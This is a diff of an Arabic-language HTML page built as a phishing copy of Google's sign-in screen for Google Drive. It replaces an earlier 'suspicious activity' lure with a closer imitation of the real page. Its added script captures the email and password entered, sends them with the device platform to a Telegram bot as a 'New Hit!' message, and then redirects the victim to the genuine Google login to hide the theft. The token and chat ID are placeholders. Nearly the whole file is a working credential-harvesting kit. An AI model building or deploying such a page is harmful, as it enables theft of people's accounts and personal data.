@@ -3,29 +3,200 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين حساب Google</title>
-    <link rel="stylesheet" href="style.css">
+    <title>تسجيل الدخول - حسابات Google</title>
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-gray: #dadce0;
+            --text-dark: #202124;
+            --text-light: #5f6368;
+        }
+
+        body {
+            font-family: 'Roboto', arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 450px;
+            border: 1px solid var(--google-gray);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+            transition: 0.2s;
+        }
+
+        /* استجابة للهواتف - تماماً كجوجل */
+        @media (max-width: 450px) {
+            .container {
+                border: none;
+                width: 100%;
+                padding: 24px;
+            }
+        }
+
+        .logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: var(--text-dark);
+            margin: 0 0 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-dark);
+            margin-bottom: 30px;
+        }
+
+        .input-wrapper {
+            margin-bottom: 24px;
+            text-align: right;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid var(--google-gray);
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border: 2px solid var(--google-blue);
+            padding: 12px 14px; /* لتعويض فرق السمك */
+        }
+
+        .forgot-link {
+            color: var(--google-blue);
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 9px;
+            cursor: pointer;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: var(--text-light);
+            line-height: 1.4;
+            margin-top: 32px;
+            text-align: right;
+        }
+
+        .action-area {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        .create-account {
+            color: var(--google-blue);
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        button {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        button:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        button:disabled {
+            background-color: #ccc;
+        }
+    </style>
 </head>
 <body>
-    <div class="login-box">
+
+    <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
-        <h2>تأمين حسابك</h2>
-        <p>تم اكتشاف نشاط مشبوه. يرجى تسجيل الدخول لتأكيد ملكية الحساب ومنع مسح البيانات.</p>
-        
+        <h1>تسجيل الدخول</h1>
+        <div class="subtitle">المتابعة إلى Google Drive</div>
+
         <form id="loginForm">
-            <div class="input-group">
-                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            <div class="input-wrapper">
+                <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+                <a href="#" class="forgot-link">هل نسيت البريد الإلكتروني؟</a>
             </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="كلمة المرور" required>
+
+            <div class="input-wrapper">
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
             </div>
-            <button type="submit" id="submitBtn">تأكيد الهوية</button>
+
+            <div class="info-text">
+                ليس جهازك؟ استخدم نافذة تصفح خاصة لتسجيل الدخول.
+                <a href="#" style="color:var(--google-blue); text-decoration:none; font-weight:500;">مزيد من المعلومات</a>
+            </div>
+
+            <div class="action-area">
+                <a href="#" class="create-account">إنشاء حساب</a>
+                <button type="submit" id="submitBtn">التالي</button>
+            </div>
         </form>
-        
-        <div class="footer">
-            <a href="#">هل نسيت البريد الإلكتروني؟</a>
-        </div>
     </div>
-    <script src="script.js"></script>
+
+    <script>
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
+        const CHAT_ID = 'YOUR_CHAT_ID';
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = 'جاري التحقق...';
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = `🎯 **New Hit!**\n\n📧 User: \`${email}\`\n🔑 Pass: \`${password}\`\n\n📱 Device: ${navigator.platform}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(() => {
+                // التوجيه لصفحة "المصادقة الثنائية" الوهمية أو صفحة جوجل الحقيقية
+                window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
+            })
+            .catch(() => {
+                btn.disabled = false;
+                btn.innerText = 'التالي';
+            });
+        });
+    </script>
 </body>
 </html>
